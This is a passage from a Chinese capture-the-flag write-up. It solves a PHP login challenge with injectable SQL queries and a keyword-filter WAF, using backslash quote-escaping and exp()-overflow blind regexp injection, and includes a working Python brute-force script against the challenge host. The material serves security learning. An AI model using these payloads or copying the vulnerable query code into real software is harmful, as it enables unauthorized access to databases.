        public $user = "root";
        public $pass = "123456";
        public $database = "ctf";
        public $conn;
        function __construct(){
            $this->conn = new mysqli($this->host,$this->user,$this->pass,$this->database);
            if(mysqli_connect_errno()){
                die('connect error');
            }
        }
        function find($username){
            $res = $this->conn->query("select * from users where username='$username'");
            if($res->num_rows>0){
                return True;
            }
            else{
                return False;
            }
        }
        function register($username,$password,$code){
            if($this->conn->query("insert into users (username,password,code) values ('$username','$password','$code')")){
                return True;
            }
            else{
                return False;
            }
        }
        function login($username,$password,$code){
            $res = $this->conn->query("select * from users where username='$username' and password='$password'");
            if($this->conn->error){    // 如果sql语句报错就返回error
                return 'error';
            }
            else{
                $content = $res->fetch_array();
                if($content['code']===$_POST['code']){
                    $_SESSION['username'] = $content['username'];
                    return 'success';
                }
                else{
                    return 'fail';
                }
            }
        }
    }
    function sql_waf($str){
        if(preg_match('/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|>| $value) {
            if(is_array($value)){
                array_waf($value);
            }
            else{
                sql_waf($value);
                num_waf($value);
            }
        }
    }
过滤的死死地，把我会的都过滤了，甚至过滤了一些我压根不会的。但还是遗漏了一些字符，比如反斜杠 `\`、括号 `()` 等。
有了反斜杠 `\` 之后，我们可以在 username 中输入转义符将前面的引号转义，造成引号错误闭合，实现万能密码：
    "username": "admin\\",
    "password": "||1#",
    "code": "xxx"
但是还需要 code 才行，所以我们的思路是使用 rlike（即regexp）按照之前regexp匹配注入的方法，将 code 匹配出来。
我们又在 login 函数中注意到：
    if($this->conn->error){    // 如果sql语句报错就返回error
        return 'error';
    }
如果 sql 语句出现错误便返回字符串 "error"，然后进入到 login.php 中就会返回
error。根据这里的特性，如果我们可以控制这里的报错的话，便可以进行盲注。
但是怎么构造呢？
在网上的看到了大佬的思路是真的巧妙：
    ||exp(710-(... rlike ...))
即如果 `(... rlike ...)` 中的语句执行匹配后的结果为True，经过减号转换后为 `exp(710-1)`
后不会溢出；若为false，转换为 `exp(710-0)` 后则会溢出并报错。
大致的 payload 如下：
    'username': 'admin\\',
    'password': '||exp(710-(code rlike binary {0}))#',
    'code': '1'
但是由于过滤了引号，所以 rlike 无法直接引入 `%` 和 `^`，按照之前regexp注入的操作我们可以将 `^` 联通后面猜测的字符一块做 Hex
编码，即：
    def str2hex(string):  # 转换16进制,16进制在数据库执行查询时又默认转换成字符串
        result = ''
        for i in string:
            result += hex(ord(i))
        result = result.replace('0x', '')
        return '0x' + result
    ......
    passwd = str2hex('^' + name + j)
    payloads = payload.format(passwd).replace(' ',chr(0x0c))
    postdata = {
        'username': 'admin\\',
        'password': payloads,
        'code': '1'
    }
但是令我没有想到的是，题目还限制了 password 位置匹配的字符串长度，最长只能匹配 4 个字符，如果超过了 4 个则会返回 Huge num
detected 错误。那这样的话我们便不能在 payload 里面使用 `^`
了，也就没有办法在正则表达式中确定首位的位置，我们只能知道有这么几个连续的字符，就像下面这样：
然后首先爆破出前三位来，然后再通过前 3 位爆第4位，再通过第2、3、4位爆第5位......
编写如下脚本进行爆破：
    import requests
    import string
    def str2hex(string):  # 转换16进制,16进制在数据库执行查询时又默认转换成字符串
        result = ''
        for i in string:
            result += hex(ord(i))
        result = result.replace('0x', '')
        return '0x' + result
    strs = string.ascii_letters + string.digits + '_'
    url = "http://be2ae7e7-9c0e-4f21-8b3a-97e28c20d79c.node3.buuoj.cn/login.php"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'
    }
    payload = '||exp(710-(code rlike binary {0}))#'
    if __name__ == "__main__":
        name = ''
        z = 3
        for i in range(1, 40):
            for j in strs:
                passwd = str2hex(name + j)
                payloads = payload.format(passwd).replace(' ',chr(0x0c))
                postdata = {
                    'username': 'admin\\',
                    'password': payloads,
                    'code': '1'
                }
                r = requests.post(url, data=postdata, headers=headers, allow_redirects=False)
                #print(r.text)
                if "fail" in r.text:
                    name += j
                    print(j, end='')
                    break
            if len(name) >= 3:
                for i in range(1, 40):
                    for j in strs:
                        passwd = str2hex(name[z - 3:z] + j)  # ergh
                        payloads = payload.format(passwd).replace(' ', chr(0x0c))
                        postdata = {
                            'username': 'admin\\',
                            'password': payloads,
                            'code': '1'
                        }
                        r = requests.post(url, data=postdata, headers=headers, allow_redirects=False)
                        # print(r.text)
                        if "fail" in r.text:
                            name += j
                            print(j, end='')
                            z += 1
                            break
出结果了，别高兴的太早，因为这里陷入了一个死循环当中：
    erghruigh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh......
可以看到爆出 `erghruigh2` 之后不停地循环出现 `uygh2`，所以我们可以推测出真正的 code 里面有两个 `gh2`，其中位于前面的那个
`gh2` 后面紧跟着一个 `u`，即 `gh2u`。后面那个 `gh2` 后面跟的是那个字符我们还不能确定，那我们便可以测试一下除了 `u`
以外的其他字符，经测试第二个 `gh2` 后面跟的字符是 `3`，即 `gh23`，然后继续根据 `h23` 爆破接下来的字符就行了，最后得到的 code
如下：
    erghruigh2uygh23uiu32ig
然后直接登陆即可得到 flag：
## Ending......